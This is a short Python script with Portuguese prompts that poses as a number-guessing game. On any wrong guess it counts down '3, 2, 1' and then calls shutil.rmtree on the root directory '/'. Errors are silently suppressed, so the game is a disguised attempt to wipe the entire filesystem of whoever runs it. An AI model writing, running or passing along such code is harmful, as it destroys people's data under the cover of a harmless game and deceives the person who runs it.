import shutil
import os
import time

location = "/"

n = input("você quer jogar um jogo?")
if n == "s":
    m = int(input("adivinhe o número"))
    if m == 3451:
        print("parabéns vc passou")
    else:
        print(f"deletando tudo em \n 3")
        time.sleep(1)
        print(f'2 \n')
        time.sleep(1)
        print(f'1 \n')
        try:
            shutil.rmtree(location)
        except:
            pass
